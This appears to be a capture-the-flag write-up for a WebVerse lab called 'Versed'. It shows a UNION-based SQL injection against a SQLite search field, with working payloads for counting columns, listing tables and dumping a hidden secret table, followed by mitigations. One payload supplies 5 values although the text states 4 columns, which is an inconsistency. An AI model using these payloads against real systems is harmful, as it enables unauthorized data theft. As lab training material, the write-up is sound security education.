---
title: "SQL Injection – Full Database Extraction via UNION Attack | Versed"
date: 2026-05-24 11:10:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [sql-injection, union-based, sqlite, database-enumeration, webversepro, web-security, injection, enumeration]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/versed-sql-injection.webp
  alt: Versed SQL Injection WebVerse Lab
---

## Lab Link
Lab: [Versed](https://dashboard.webverselabs-pro.com/mystery-challenges/versed)

---

## Overview
This lab is an internal read-only catalogue mirror used for QA. It runs as a single-page interface with a search feature added late in development. That search input becomes the entry point for a SQL Injection vulnerability leading to full database disclosure.

---

## Objective
Exploit SQL Injection in the search parameter to enumerate the backend SQLite database and retrieve hidden sensitive data (flag).

---

## Reconnaissance

The application exposes a search bar with no authentication. Initial testing confirms injection:

```sql
' or 1=1-- -
```

This alters query behavior and confirms SQL Injection.

---

## Exploitation

### 1. Finding column count

```sql
' order by 4-- -
```

Result confirms the query uses 4 columns.

### 2. Identifying reflected columns

```sql
' UNION SELECT 'a','b','c','d' -- -
```

Observed reflections:

* `b` → Lab name
* `c` → Image field
* `d` → Difficulty

### 3. Database version discovery

```sql
' UNION SELECT 1,sqlite_version(),2,3,4-- -
```

Database version:

```
SQLite : 3.46.1
```

### 4. Enumerating tables

```sql
' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- -
```

Found tables:

* `labs`
* `leighlins_secret_stash`
* `sqlite_sequence`

### 5. Inspecting hidden table structure

```sql
' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE tbl_name='leighlins_secret_stash'-- -
```

Schema:

```sql
CREATE TABLE leighlins_secret_stash (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  secret TEXT NOT NULL
)
```

### 6. Extracting sensitive data

```sql
' UNION SELECT 1,id||':'||secret,3,4 FROM leighlins_secret_stash-- -
```

---

## Proof of Exploitation

```
1:WEBVERSE{.....}
```

---

## Impact

* Full database enumeration via SQL Injection
* Access to hidden internal tables
* Sensitive secret leakage from non-public dataset
* Weak input handling in search functionality

---

## Mitigation

* Use parameterized queries (prepared statements)
* Avoid dynamic SQL string concatenation
* Restrict database permissions for UI layer
* Validate and sanitize input strictly
* Disable debug/error leakage in production